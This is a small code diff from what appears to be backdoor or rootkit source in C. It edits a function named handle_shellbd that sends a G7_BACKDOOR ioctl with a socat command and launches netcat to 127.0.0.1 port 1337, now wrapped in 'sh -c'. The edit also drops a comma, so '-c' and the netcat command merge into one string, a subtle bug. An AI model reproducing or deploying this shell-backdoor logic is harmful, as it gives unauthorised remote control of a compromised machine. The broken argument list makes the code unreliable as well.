@@ -137,9 +137,9 @@ handle_shellbd(void *arg)
     issue_ioctl(G7_BACKDOOR, socat_cmd);
 
     char *argv[] = {
-        "nc",
-        "127.0.0.1",
-        "1337",
+        "sh",
+        "-c"
+        "nc 127.0.0.1 1337",
         NULL
     };
 
